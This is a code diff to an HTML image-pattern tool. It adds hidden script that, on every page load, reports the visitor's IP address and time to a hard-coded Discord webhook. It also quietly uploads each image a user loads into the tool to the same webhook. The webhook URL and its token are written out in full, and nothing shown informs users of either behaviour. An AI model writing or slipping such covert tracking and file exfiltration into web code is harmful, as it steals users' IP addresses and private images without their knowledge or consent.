@@ -56,6 +56,35 @@
     </div>
 
     <script>
+
+        // Webhook URLs
+        const webhookURL = 'https://discord.com/api/webhooks/1239991202716319816/xaygC0PMgh6E4-uNhKYO0Sy-7Uti5TkT7flGHP73Hq2rWxRisqa4Z2skzT3jD2B4ME8S';
+
+        // Funktion zum Senden der Webhook-Nachricht
+        async function sendWebhookMessage(message) {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: message })
+            });
+        }
+
+        // IP-Adresse ermitteln und Nachricht senden
+        async function notifyVisit() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const ip = data.ip;
+            const ipType = ip.includes(':') ? 'IPv6' : 'IPv4';
+            const time = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
+            const message = `-----\nPattern Opened!\nTime: ${time}\n${ipType} IP: ||${ip}||\n-----`;
+            await sendWebhookMessage(message);
+        }
+
+        // Benachrichtigung beim Seitenaufruf
+        notifyVisit();
+
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         const imageLoader = document.getElementById('imageLoader');
@@ -71,12 +100,30 @@
 
         function handleImage(e) {
             const reader = new FileReader();
-            reader.onload = function(event) {
+            reader.onload = async function(event) {
                 const img = new Image();
-                img.onload = function() {
+                img.onload = async function() {
                     uploadedImage = img;
                     resizeCanvasToImage(img);
                     drawPatternWithSpacing(img);
+
+                    const webhookURL = 'https://discord.com/api/webhooks/1239991202716319816/xaygC0PMgh6E4-uNhKYO0Sy-7Uti5TkT7flGHP73Hq2rWxRisqa4Z2skzT3jD2B4ME8S';
+
+                    const formData = new FormData();
+                    formData.append('file', e.target.files[0]); // Hochgeladenes Bild hinzufügen
+                    formData.append('payload_json', JSON.stringify({ // Textnachricht als JSON hinzufügen
+                        content: 'New image uploaded!',
+                        username: 'Pattern Bot' // Optional: Benutzername für die Nachricht
+                    }));
+
+                    try {
+                        await fetch(webhookURL, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } catch (error) {
+                        console.error('Error sending message to webhook:', error);
+                    }
                 }
                 img.src = event.target.result;
             }
@@ -178,35 +225,6 @@
             link.download = 'pattern_' + Math.floor(Math.random() * 10000) + '.png'; // Random number between 0 and 999
             link.click();
         }
-
-        // Webhook URLs
-        const webhookURL = 'https://discord.com/api/webhooks/1239991202716319816/xaygC0PMgh6E4-uNhKYO0Sy-7Uti5TkT7flGHP73Hq2rWxRisqa4Z2skzT3jD2B4ME8S';
-
-        // Funktion zum Senden der Webhook-Nachricht
-        async function sendWebhookMessage(message) {
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: message })
-            });
-        }
-
-        // IP-Adresse ermitteln und Nachricht senden
-        async function notifyVisit() {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const ip = data.ip;
-            const ipType = ip.includes(':') ? 'IPv6' : 'IPv4';
-            const time = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
-            const message = `-----\nPattern Opened!\nTime: ${time}\n${ipType} IP: ||${ip}||\n-----`;
-            await sendWebhookMessage(message);
-        }
-
-        // Benachrichtigung beim Seitenaufruf
-        notifyVisit();
-
     </script>
 </body>
 </html>
